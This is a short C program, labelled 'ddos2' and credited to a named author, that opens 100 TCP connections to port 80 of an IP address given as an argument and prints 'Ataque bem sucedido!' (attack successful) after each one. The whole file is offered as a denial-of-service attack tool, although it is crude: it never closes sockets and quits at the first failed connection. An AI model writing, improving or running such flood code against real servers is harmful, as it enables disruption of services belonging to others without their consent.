// ddos2
// Adiel Ribeiro
// 11out2022
// contato@nuvym.net
///////////////////////////////////////////////////////////////////////////////////////////////
#include <stdio.h>
#include <sys/socket.h> 
#include <netdb.h>
#include <stdlib.h>

int main(int argc, char *argv[]){

    int mysocket;
    int conexao;
    int contador;
    int inicio = 0;
    int fim = 100;
    char *destino; 
    destino = argv[1];
    int ssh = 22;
    int http = 80;
    int https = 443;
    int ftp = 21;

    struct sockaddr_in alvo; 

    if(argc<=1){
        printf("Entre com o ip \n");
        return 0;

    } else {

    for(contador=inicio;contador<100;contador++){

    mysocket = socket(AF_INET,SOCK_STREAM,0);
    alvo.sin_family = AF_INET;
    alvo.sin_port = htons(http);
    alvo.sin_addr.s_addr = inet_addr(destino);

    conexao = connect(mysocket, (struct sockaddr *)&alvo, sizeof alvo);

    if(conexao == 0){
       printf("Ataque bem sucedido! \n");
  
    } else {
               printf("Falhou... \n");
               return 0;
    }
    }
    }
}

